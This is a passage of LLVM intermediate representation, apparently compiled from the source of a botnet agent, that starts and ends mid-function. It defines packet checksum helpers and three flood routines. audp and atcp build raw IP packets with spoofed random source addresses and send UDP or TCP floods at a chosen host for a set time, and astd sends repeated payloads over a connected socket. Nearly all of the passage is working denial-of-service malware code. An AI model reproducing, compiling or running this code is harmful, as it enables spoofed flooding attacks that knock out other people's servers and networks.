  %26 = getelementptr inbounds i16, i16* %.01012, i64 4
  %27 = load i16, i16* %22, align 2
  %28 = zext i16 %27 to i64
  %29 = add i64 %28, %25
  %30 = add nsw i32 %.0913, -8
  %31 = icmp sgt i32 %30, 1
  br i1 %31, label %.lr.ph16, label %._crit_edge17.loopexit.unr-lcssa

._crit_edge17.loopexit.unr-lcssa:                 ; preds = %.lr.ph16
  br label %._crit_edge17.loopexit

._crit_edge17.loopexit:                           ; preds = %.lr.ph16.prol.loopexit, %._crit_edge17.loopexit.unr-lcssa
  %.lcssa26 = phi i64 [ %.lcssa26.unr, %.lr.ph16.prol.loopexit ], [ %29, %._crit_edge17.loopexit.unr-lcssa ]
  %scevgep = getelementptr i16, i16* %0, i64 %6
  %32 = sub i32 %4, %7
  br label %._crit_edge17

._crit_edge17:                                    ; preds = %._crit_edge17.loopexit, %2
  %.010.lcssa = phi i16* [ %0, %2 ], [ %scevgep, %._crit_edge17.loopexit ]
  %.09.lcssa = phi i32 [ %1, %2 ], [ %32, %._crit_edge17.loopexit ]
  %.0.lcssa = phi i64 [ 0, %2 ], [ %.lcssa26, %._crit_edge17.loopexit ]
  %33 = icmp eq i32 %.09.lcssa, 1
  br i1 %33, label %34, label %.preheader

; <label>:34:                                     ; preds = %._crit_edge17
  %35 = bitcast i16* %.010.lcssa to i8*
  %36 = load i8, i8* %35, align 1
  %37 = zext i8 %36 to i64
  %38 = add i64 %37, %.0.lcssa
  br label %.preheader

.preheader:                                       ; preds = %34, %._crit_edge17
  %.1.ph = phi i64 [ %.0.lcssa, %._crit_edge17 ], [ %38, %34 ]
  %39 = lshr i64 %.1.ph, 16
  %40 = icmp eq i64 %39, 0
  br i1 %40, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %41 = phi i64 [ %44, %.lr.ph ], [ %39, %.lr.ph.preheader ]
  %.111 = phi i64 [ %43, %.lr.ph ], [ %.1.ph, %.lr.ph.preheader ]
  %42 = and i64 %.111, 65535
  %43 = add nuw nsw i64 %42, %41
  %44 = lshr i64 %43, 16
  %45 = icmp eq i64 %44, 0
  br i1 %45, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.1.lcssa = phi i64 [ %.1.ph, %.preheader ], [ %43, %._crit_edge.loopexit ]
  %46 = trunc i64 %.1.lcssa to i16
  %47 = xor i16 %46, -1
  ret i16 %47
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr* nocapture readonly, %struct.tcphdr* nocapture readonly) local_unnamed_addr #1 {
  %3 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  %4 = load i32, i32* %3, align 4
  %5 = zext i32 %4 to i64
  %6 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 9
  %7 = load i32, i32* %6, align 4
  %8 = zext i32 %7 to i64
  %9 = tail call zeroext i16 @htons(i16 zeroext 20) #13
  %10 = tail call noalias i8* @malloc(i64 44) #7
  %11 = bitcast i8* %10 to i16*
  %.sroa.0.0..sroa_cast = bitcast i8* %10 to i64*
  store i64 %5, i64* %.sroa.0.0..sroa_cast, align 1
  %.sroa.2.0..sroa_idx6 = getelementptr inbounds i8, i8* %10, i64 8
  %.sroa.2.0..sroa_cast = bitcast i8* %.sroa.2.0..sroa_idx6 to i64*
  store i64 %8, i64* %.sroa.2.0..sroa_cast, align 1
  %.sroa.3.0..sroa_idx = getelementptr inbounds i8, i8* %10, i64 16
  store i8 0, i8* %.sroa.3.0..sroa_idx, align 1
  %.sroa.4.0..sroa_raw_idx = getelementptr inbounds i8, i8* %10, i64 17
  store i8 6, i8* %.sroa.4.0..sroa_raw_idx, align 1
  %.sroa.5.0..sroa_idx7 = getelementptr inbounds i8, i8* %10, i64 18
  %12 = bitcast i8* %.sroa.5.0..sroa_idx7 to i16*
  store i16 %9, i16* %12, align 1
  %13 = getelementptr inbounds i8, i8* %10, i64 24
  %14 = bitcast %struct.tcphdr* %1 to i8*
  tail call void @llvm.memcpy.p0i8.p0i8.i64(i8* %13, i8* %14, i64 20, i32 1, i1 false)
  %15 = tail call zeroext i16 @csum(i16* %11, i32 44)
  tail call void @free(i8* %10) #7
  ret i16 %15
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: noinline norecurse nounwind uwtable
define void @makeIPPacket(%struct.iphdr* nocapture, i32, i32, i8 zeroext, i32) local_unnamed_addr #0 {
  %6 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 0
  store i8 69, i8* %6, align 4
  %7 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 1
  store i8 0, i8* %7, align 1
  %8 = trunc i32 %4 to i16
  %9 = add i16 %8, 20
  %10 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 2
  store i16 %9, i16* %10, align 2
  %11 = tail call i32 @rand_cmwc()
  %12 = trunc i32 %11 to i16
  %13 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 3
  store i16 %12, i16* %13, align 4
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 4
  store i16 0, i16* %14, align 2
  %15 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 5
  store i8 -1, i8* %15, align 4
  %16 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 6
  store i8 %3, i8* %16, align 1
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 7
  store i16 0, i16* %17, align 2
  %18 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  store i32 %2, i32* %18, align 4
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 9
  store i32 %1, i32* %19, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @audp(i8*, i32, i32, i32, i32, i32) local_unnamed_addr #1 {
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 0
  store i16 2, i16* %9, align 4
  %10 = icmp eq i32 %1, 0
  br i1 %10, label %11, label %14

; <label>:11:                                     ; preds = %6
  %12 = tail call i32 @rand_cmwc()
  %13 = trunc i32 %12 to i16
  br label %17

; <label>:14:                                     ; preds = %6
  %15 = trunc i32 %1 to i16
  %16 = tail call zeroext i16 @htons(i16 zeroext %15) #13
  br label %17

; <label>:17:                                     ; preds = %14, %11
  %.sink = phi i16 [ %16, %14 ], [ %13, %11 ]
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 1
  store i16 %.sink, i16* %18, align 2
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 2
  %20 = call i32 @getHost(i8* %0, %struct.in_addr* %19)
  %21 = icmp eq i32 %20, 0
  br i1 %21, label %22, label %.loopexit

; <label>:22:                                     ; preds = %17
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 3, i64 0
  %24 = bitcast i8* %23 to i64*
  store i64 0, i64* %24, align 4
  %25 = icmp eq i32 %3, 32
  br i1 %25, label %26, label %50

; <label>:26:                                     ; preds = %22
  %27 = tail call i32 @socket(i32 2, i32 2, i32 17) #7
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %.loopexit, label %29

; <label>:29:                                     ; preds = %26
  %30 = add nsw i32 %4, 1
  %31 = sext i32 %30 to i64
  %32 = tail call noalias i8* @malloc(i64 %31) #7
  %33 = icmp eq i8* %32, null
  br i1 %33, label %.loopexit, label %34

; <label>:34:                                     ; preds = %29
  tail call void @llvm.memset.p0i8.i64(i8* nonnull %32, i8 0, i64 %31, i32 1, i1 false)
  tail call void @makeRandomStr(i8* nonnull %32, i32 %4)
  %35 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #7
  %36 = add nsw i32 %35, %2
  %37 = sext i32 %4 to i64
  %38 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  br label %.backedge

.backedge:                                        ; preds = %.backedge.backedge, %34
  %.058 = phi i32 [ 0, %34 ], [ %.058.be, %.backedge.backedge ]
  %39 = call i64 @sendto(i32 %27, i8* nonnull %32, i64 %37, i32 0, %struct.sockaddr* nonnull %38, i32 16) #7
  %40 = icmp eq i32 %.058, %5
  br i1 %40, label %41, label %48

; <label>:41:                                     ; preds = %.backedge
  br i1 %10, label %42, label %45

; <label>:42:                                     ; preds = %41
  %43 = call i32 @rand_cmwc()
  %44 = trunc i32 %43 to i16
  store i16 %44, i16* %18, align 2
  br label %45

; <label>:45:                                     ; preds = %42, %41
  %46 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #7
  %47 = icmp sgt i32 %46, %36
  br i1 %47, label %.loopexit.loopexit, label %.backedge.backedge

; <label>:48:                                     ; preds = %.backedge
  %49 = add i32 %.058, 1
  br label %.backedge.backedge

.backedge.backedge:                               ; preds = %48, %45
  %.058.be = phi i32 [ %49, %48 ], [ 0, %45 ]
  br label %.backedge

; <label>:50:                                     ; preds = %22
  %51 = tail call i32 @socket(i32 2, i32 3, i32 17) #7
  %52 = icmp eq i32 %51, 0
  br i1 %52, label %.loopexit, label %53

; <label>:53:                                     ; preds = %50
  store i32 1, i32* %8, align 4
  %54 = bitcast i32* %8 to i8*
  %55 = call i32 @setsockopt(i32 %51, i32 0, i32 3, i8* nonnull %54, i32 4) #7
  %56 = icmp slt i32 %55, 0
  br i1 %56, label %.loopexit, label %.preheader.preheader

.preheader.preheader:                             ; preds = %53
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %.preheader
  %.05962 = phi i32 [ %57, %.preheader ], [ 50, %.preheader.preheader ]
  %57 = add nsw i32 %.05962, -1
  %58 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #7
  %59 = call i32 @rand_cmwc()
  %60 = xor i32 %59, %58
  call void @srand(i32 %60) #7
  %61 = call i32 @rand() #7
  call void @init_rand(i32 %61)
  %62 = icmp eq i32 %57, 0
  br i1 %62, label %63, label %.preheader

; <label>:63:                                     ; preds = %.preheader
  %64 = icmp eq i32 %3, 0
  %65 = sub nsw i32 32, %3
  %66 = shl i32 -1, %65
  %.060 = select i1 %64, i32 0, i32 %66
  %67 = sext i32 %4 to i64
  %68 = add nsw i64 %67, 28
  %69 = call i8* @llvm.stacksave()
  %70 = alloca i8, i64 %68, align 16
  %71 = bitcast i8* %70 to %struct.iphdr*
  %72 = getelementptr i8, i8* %70, i64 20
  %73 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %19, i64 0, i32 0
  %74 = load i32, i32* %73, align 4
  %75 = call i32 @getRandomIP(i32 %.060)
  %76 = call i32 @htonl(i32 %75) #13
  %77 = add nsw i64 %67, 8
  %78 = trunc i64 %77 to i32
  call void @makeIPPacket(%struct.iphdr* nonnull %71, i32 %74, i32 %76, i8 zeroext 17, i32 %78)
  %79 = trunc i64 %77 to i16
  %80 = call zeroext i16 @htons(i16 zeroext %79) #13
  %81 = getelementptr inbounds i8, i8* %70, i64 24
  %82 = bitcast i8* %81 to i16*
  store i16 %80, i16* %82, align 8
  %83 = call i32 @rand_cmwc()
  %84 = trunc i32 %83 to i16
  %85 = bitcast i8* %72 to i16*
  store i16 %84, i16* %85, align 4
  br i1 %10, label %86, label %88

; <label>:86:                                     ; preds = %63
  %87 = call i32 @rand_cmwc()
  br label %92

; <label>:88:                                     ; preds = %63
  %89 = trunc i32 %1 to i16
  %90 = call zeroext i16 @htons(i16 zeroext %89) #13
  %91 = zext i16 %90 to i32
  br label %92

; <label>:92:                                     ; preds = %88, %86
  %93 = phi i32 [ %87, %86 ], [ %91, %88 ]
  %94 = trunc i32 %93 to i16
  %95 = getelementptr inbounds i8, i8* %70, i64 22
  %96 = bitcast i8* %95 to i16*
  store i16 %94, i16* %96, align 2
  %97 = getelementptr inbounds i8, i8* %70, i64 26
  %98 = bitcast i8* %97 to i16*
  store i16 0, i16* %98, align 2
  %99 = getelementptr inbounds i8, i8* %70, i64 28
  call void @makeRandomStr(i8* %99, i32 %4)
  %100 = bitcast i8* %70 to i16*
  %101 = getelementptr inbounds i8, i8* %70, i64 2
  %102 = bitcast i8* %101 to i16*
  %103 = load i16, i16* %102, align 2
  %104 = zext i16 %103 to i32
  %105 = call zeroext i16 @csum(i16* nonnull %100, i32 %104)
  %106 = getelementptr inbounds i8, i8* %70, i64 10
  %107 = bitcast i8* %106 to i16*
  store i16 %105, i16* %107, align 2
  %108 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #7
  %109 = add nsw i32 %108, %2
  %110 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %111 = getelementptr inbounds i8, i8* %70, i64 4
  %112 = bitcast i8* %111 to i16*
  %113 = getelementptr inbounds i8, i8* %70, i64 12
  %114 = bitcast i8* %113 to i32*
  %115 = trunc i32 %1 to i16
  br label %.backedge61

.backedge61:                                      ; preds = %.backedge61.backedge, %92
  %.0 = phi i32 [ 0, %92 ], [ %.0.be, %.backedge61.backedge ]
  %116 = call i64 @sendto(i32 %51, i8* nonnull %70, i64 %68, i32 0, %struct.sockaddr* nonnull %110, i32 16) #7
  %117 = call i32 @rand_cmwc()
  %118 = trunc i32 %117 to i16
  store i16 %118, i16* %85, align 4
  br i1 %10, label %119, label %121

; <label>:119:                                    ; preds = %.backedge61
  %120 = call i32 @rand_cmwc()
  br label %124

; <label>:121:                                    ; preds = %.backedge61
  %122 = call zeroext i16 @htons(i16 zeroext %115) #13
  %123 = zext i16 %122 to i32
  br label %124

; <label>:124:                                    ; preds = %121, %119
  %125 = phi i32 [ %120, %119 ], [ %123, %121 ]
  %126 = trunc i32 %125 to i16
  store i16 %126, i16* %96, align 2
  %127 = call i32 @rand_cmwc()
  %128 = trunc i32 %127 to i16
  store i16 %128, i16* %112, align 4
  %129 = call i32 @getRandomIP(i32 %.060)
  %130 = call i32 @htonl(i32 %129) #13
  store i32 %130, i32* %114, align 4
  %131 = load i16, i16* %102, align 2
  %132 = zext i16 %131 to i32
  %133 = call zeroext i16 @csum(i16* nonnull %100, i32 %132)
  store i16 %133, i16* %107, align 2
  %134 = icmp eq i32 %.0, %5
  br i1 %134, label %135, label %138

; <label>:135:                                    ; preds = %124
  %136 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #7
  %137 = icmp sgt i32 %136, %109
  br i1 %137, label %140, label %.backedge61.backedge

; <label>:138:                                    ; preds = %124
  %139 = add i32 %.0, 1
  br label %.backedge61.backedge

.backedge61.backedge:                             ; preds = %138, %135
  %.0.be = phi i32 [ %139, %138 ], [ 0, %135 ]
  br label %.backedge61

; <label>:140:                                    ; preds = %135
  call void @llvm.stackrestore(i8* %69)
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %45
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %26, %50, %17, %53, %29, %140
  ret void
}

declare i32 @time(...) local_unnamed_addr #3

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare void @srand(i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @rand() local_unnamed_addr #4

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #7

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) local_unnamed_addr #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #7

; Function Attrs: noinline nounwind uwtable
define void @atcp(i8*, i32, i32, i32, i8*, i32, i32) local_unnamed_addr #1 {
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i32, align 4
  %10 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 0
  store i16 2, i16* %10, align 4
  %11 = icmp eq i32 %1, 0
  br i1 %11, label %12, label %15

; <label>:12:                                     ; preds = %7
  %13 = tail call i32 @rand_cmwc()
  %14 = trunc i32 %13 to i16
  br label %18

; <label>:15:                                     ; preds = %7
  %16 = trunc i32 %1 to i16
  %17 = tail call zeroext i16 @htons(i16 zeroext %16) #13
  br label %18

; <label>:18:                                     ; preds = %15, %12
  %.sink = phi i16 [ %17, %15 ], [ %14, %12 ]
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 1
  store i16 %.sink, i16* %19, align 2
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 2
  %21 = call i32 @getHost(i8* %0, %struct.in_addr* %20)
  %22 = icmp eq i32 %21, 0
  br i1 %22, label %23, label %142

; <label>:23:                                     ; preds = %18
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 3, i64 0
  %25 = bitcast i8* %24 to i64*
  store i64 0, i64* %25, align 4
  %26 = tail call i32 @socket(i32 2, i32 3, i32 6) #7
  %27 = icmp eq i32 %26, 0
  br i1 %27, label %142, label %28

; <label>:28:                                     ; preds = %23
  store i32 1, i32* %9, align 4
  %29 = bitcast i32* %9 to i8*
  %30 = call i32 @setsockopt(i32 %26, i32 0, i32 3, i8* nonnull %29, i32 4) #7
  %31 = icmp slt i32 %30, 0
  br i1 %31, label %142, label %32

; <label>:32:                                     ; preds = %28
  %33 = icmp eq i32 %3, 0
  %34 = sub nsw i32 32, %3
  %35 = shl i32 -1, %34
  %.074 = select i1 %33, i32 0, i32 %35
  %36 = sext i32 %5 to i64
  %37 = add nsw i64 %36, 40
  %38 = call i8* @llvm.stacksave()
  %39 = alloca i8, i64 %37, align 16
  %40 = bitcast i8* %39 to %struct.iphdr*
  %41 = getelementptr i8, i8* %39, i64 20
  %42 = bitcast i8* %41 to %struct.tcphdr*
  %43 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %20, i64 0, i32 0
  %44 = load i32, i32* %43, align 4
  %45 = call i32 @getRandomIP(i32 %.074)
  %46 = call i32 @htonl(i32 %45) #13
  %47 = add i32 %5, 20
  call void @makeIPPacket(%struct.iphdr* nonnull %40, i32 %44, i32 %46, i8 zeroext 6, i32 %47)
  %48 = call i32 @rand_cmwc()
  %49 = trunc i32 %48 to i16
  %50 = bitcast i8* %41 to i16*
  store i16 %49, i16* %50, align 4
  %51 = call i32 @rand_cmwc()
  %52 = getelementptr inbounds i8, i8* %39, i64 24
  %53 = bitcast i8* %52 to i32*
  store i32 %51, i32* %53, align 8
  %54 = getelementptr inbounds i8, i8* %39, i64 28
  %55 = bitcast i8* %54 to i32*
  store i32 0, i32* %55, align 4
  %56 = getelementptr inbounds i8, i8* %39, i64 32
  %57 = bitcast i8* %56 to i16*
  %58 = load i16, i16* %57, align 16
  %59 = and i16 %58, -241
  %60 = or i16 %59, 80
  store i16 %60, i16* %57, align 16
  %61 = call i32 @strcmp(i8* %4, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.4, i64 0, i64 0)) #14
  %62 = icmp eq i32 %61, 0
  br i1 %62, label %65, label %.preheader

.preheader:                                       ; preds = %32
  %63 = call i8* @strtok(i8* %4, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0)) #7
  %64 = icmp eq i8* %63, null
  br i1 %64, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

; <label>:65:                                     ; preds = %32
  %66 = and i16 %58, -8177
  %67 = or i16 %66, 8016
  store i16 %67, i16* %57, align 16
  br label %.loopexit

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.backedge77
  %68 = phi i8* [ %83, %.backedge77 ], [ %63, %.lr.ph.preheader ]
  %69 = call i32 @strcmp(i8* nonnull %68, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.6, i64 0, i64 0)) #14
  %70 = icmp eq i32 %69, 0
  br i1 %70, label %.sink.split, label %71

; <label>:71:                                     ; preds = %.lr.ph
  %72 = call i32 @strcmp(i8* nonnull %68, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.7, i64 0, i64 0)) #14
  %73 = icmp eq i32 %72, 0
  br i1 %73, label %.sink.split, label %74

; <label>:74:                                     ; preds = %71
  %75 = call i32 @strcmp(i8* nonnull %68, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.8, i64 0, i64 0)) #14
  %76 = icmp eq i32 %75, 0
  br i1 %76, label %.sink.split, label %77

; <label>:77:                                     ; preds = %74
  %78 = call i32 @strcmp(i8* nonnull %68, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.9, i64 0, i64 0)) #14
  %79 = icmp eq i32 %78, 0
  br i1 %79, label %.sink.split, label %80

; <label>:80:                                     ; preds = %77
  %81 = call i32 @strcmp(i8* nonnull %68, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.10, i64 0, i64 0)) #14
  %82 = icmp eq i32 %81, 0
  br i1 %82, label %.sink.split, label %.backedge77

.backedge77:                                      ; preds = %80, %.sink.split
  %83 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0)) #7
  %84 = icmp eq i8* %83, null
  br i1 %84, label %.loopexit.loopexit, label %.lr.ph

.sink.split:                                      ; preds = %80, %77, %74, %71, %.lr.ph
  %.sink7 = phi i16 [ -513, %.lr.ph ], [ -1025, %71 ], [ -257, %74 ], [ -4097, %77 ], [ -2049, %80 ]
  %.sink5 = phi i16 [ 512, %.lr.ph ], [ 1024, %71 ], [ 256, %74 ], [ 4096, %77 ], [ 2048, %80 ]
  %85 = load i16, i16* %57, align 16
  %86 = and i16 %85, %.sink7
  %87 = or i16 %86, %.sink5
  store i16 %87, i16* %57, align 16
  br label %.backedge77

.loopexit.loopexit:                               ; preds = %.backedge77
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.preheader, %65
  %88 = call i32 @rand_cmwc()
  %89 = trunc i32 %88 to i16
  %90 = getelementptr inbounds i8, i8* %39, i64 34
  %91 = bitcast i8* %90 to i16*
  store i16 %89, i16* %91, align 2
  %92 = getelementptr inbounds i8, i8* %39, i64 36
  %93 = bitcast i8* %92 to i16*
  store i16 0, i16* %93, align 4
  %94 = getelementptr inbounds i8, i8* %39, i64 38
  %95 = bitcast i8* %94 to i16*
  store i16 0, i16* %95, align 2
  br i1 %11, label %96, label %98

; <label>:96:                                     ; preds = %.loopexit
  %97 = call i32 @rand_cmwc()
  br label %102

; <label>:98:                                     ; preds = %.loopexit
  %99 = trunc i32 %1 to i16
  %100 = call zeroext i16 @htons(i16 zeroext %99) #13
  %101 = zext i16 %100 to i32
  br label %102

; <label>:102:                                    ; preds = %98, %96
  %103 = phi i32 [ %97, %96 ], [ %101, %98 ]
  %104 = trunc i32 %103 to i16
  %105 = getelementptr inbounds i8, i8* %39, i64 22
  %106 = bitcast i8* %105 to i16*
  store i16 %104, i16* %106, align 2
  %107 = call zeroext i16 @tcpcsum(%struct.iphdr* nonnull %40, %struct.tcphdr* nonnull %42)
  store i16 %107, i16* %93, align 4
  %108 = bitcast i8* %39 to i16*
  %109 = getelementptr inbounds i8, i8* %39, i64 2
  %110 = bitcast i8* %109 to i16*
  %111 = load i16, i16* %110, align 2
  %112 = zext i16 %111 to i32
  %113 = call zeroext i16 @csum(i16* nonnull %108, i32 %112)
  %114 = getelementptr inbounds i8, i8* %39, i64 10
  %115 = bitcast i8* %114 to i16*
  store i16 %113, i16* %115, align 2
  %116 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #7
  %117 = add nsw i32 %116, %2
  %118 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %119 = getelementptr inbounds i8, i8* %39, i64 12
  %120 = bitcast i8* %119 to i32*
  %121 = getelementptr inbounds i8, i8* %39, i64 4
  %122 = bitcast i8* %121 to i16*
  br label %.backedge

.backedge:                                        ; preds = %.backedge.backedge, %102
  %.0 = phi i32 [ 0, %102 ], [ %.0.be, %.backedge.backedge ]
  %123 = call i64 @sendto(i32 %26, i8* nonnull %39, i64 %37, i32 0, %struct.sockaddr* nonnull %118, i32 16) #7
  %124 = call i32 @getRandomIP(i32 %.074)
  %125 = call i32 @htonl(i32 %124) #13
  store i32 %125, i32* %120, align 4
  %126 = call i32 @rand_cmwc()
  %127 = trunc i32 %126 to i16
  store i16 %127, i16* %122, align 4
  %128 = call i32 @rand_cmwc()
  store i32 %128, i32* %53, align 8
  %129 = call i32 @rand_cmwc()
  %130 = trunc i32 %129 to i16
  store i16 %130, i16* %50, align 4
  store i16 0, i16* %93, align 4
  %131 = call zeroext i16 @tcpcsum(%struct.iphdr* nonnull %40, %struct.tcphdr* nonnull %42)
  store i16 %131, i16* %93, align 4
  %132 = load i16, i16* %110, align 2
  %133 = zext i16 %132 to i32
  %134 = call zeroext i16 @csum(i16* nonnull %108, i32 %133)
  store i16 %134, i16* %115, align 2
  %135 = icmp eq i32 %.0, %6
  br i1 %135, label %136, label %139

; <label>:136:                                    ; preds = %.backedge
  %137 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #7
  %138 = icmp sgt i32 %137, %117
  br i1 %138, label %141, label %.backedge.backedge

; <label>:139:                                    ; preds = %.backedge
  %140 = add i32 %.0, 1
  br label %.backedge.backedge

.backedge.backedge:                               ; preds = %139, %136
  %.0.be = phi i32 [ %140, %139 ], [ 0, %136 ]
  br label %.backedge

; <label>:141:                                    ; preds = %136
  call void @llvm.stackrestore(i8* %38)
  br label %142

; <label>:142:                                    ; preds = %23, %18, %28, %141
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8* nocapture, i8* nocapture) local_unnamed_addr #6

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8* nocapture readonly) local_unnamed_addr #4

; Function Attrs: noinline noreturn nounwind uwtable
define void @astd(i8*, i32, i32) local_unnamed_addr #9 {
  %4 = alloca %struct.sockaddr_in, align 4
  %5 = alloca [5 x i8*], align 16
  %6 = tail call i32 @socket(i32 2, i32 2, i32 0) #7
  %7 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #7
  %8 = sext i32 %7 to i64
  %9 = tail call %struct.hostent* @gethostbyname(i8* %0) #7
  %10 = bitcast %struct.sockaddr_in* %4 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %10, i8 0, i64 16, i32 4, i1 false)
  %11 = getelementptr inbounds %struct.hostent, %struct.hostent* %9, i64 0, i32 4
  %12 = load i8**, i8*** %11, align 8
  %13 = load i8*, i8** %12, align 8
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 2
  %15 = bitcast %struct.in_addr* %14 to i8*
  %16 = getelementptr inbounds %struct.hostent, %struct.hostent* %9, i64 0, i32 3
  %17 = load i32, i32* %16, align 4
  %18 = sext i32 %17 to i64
  call void @bcopy(i8* %13, i8* %15, i64 %18) #7
  %19 = getelementptr inbounds %struct.hostent, %struct.hostent* %9, i64 0, i32 2
  %20 = load i32, i32* %19, align 8
  %21 = trunc i32 %20 to i16
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 0
  store i16 %21, i16* %22, align 4
  %23 = trunc i32 %1 to i16
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 1
  store i16 %23, i16* %24, align 2
  %25 = bitcast [5 x i8*]* %5 to i8*
  %26 = getelementptr inbounds [5 x i8*], [5 x i8*]* %5, i64 0, i64 0
  %27 = getelementptr inbounds [5 x i8*], [5 x i8*]* %5, i64 0, i64 1
  %28 = getelementptr inbounds [5 x i8*], [5 x i8*]* %5, i64 0, i64 2
  %29 = getelementptr inbounds [5 x i8*], [5 x i8*]* %5, i64 0, i64 3
  %30 = getelementptr inbounds [5 x i8*], [5 x i8*]* %5, i64 0, i64 4
  %31 = bitcast %struct.sockaddr_in* %4 to %struct.sockaddr*
  %32 = sext i32 %2 to i64
  %33 = add nsw i64 %8, %32
  br label %34

; <label>:34:                                     ; preds = %34, %3
  store i8* getelementptr inbounds ([159 x i8], [159 x i8]* @.str.11, i64 0, i64 0), i8** %26, align 16
  store i8* getelementptr inbounds ([356 x i8], [356 x i8]* @.str.12, i64 0, i64 0), i8** %27, align 8
  store i8* getelementptr inbounds ([193 x i8], [193 x i8]* @.str.13, i64 0, i64 0), i8** %28, align 16
  store i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.14, i64 0, i64 0), i8** %29, align 8
  store i8* getelementptr inbounds ([193 x i8], [193 x i8]* @.str.15, i64 0, i64 0), i8** %30, align 16
  %35 = call i64 @send(i32 %6, i8* nonnull %25, i64 1460, i32 0) #7
  %36 = call i32 @connect(i32 %6, %struct.sockaddr* nonnull %31, i32 16) #7
  %37 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #7
  %38 = sext i32 %37 to i64
  %39 = icmp slt i64 %38, %33
  br i1 %39, label %34, label %40

; <label>:40:                                     ; preds = %34
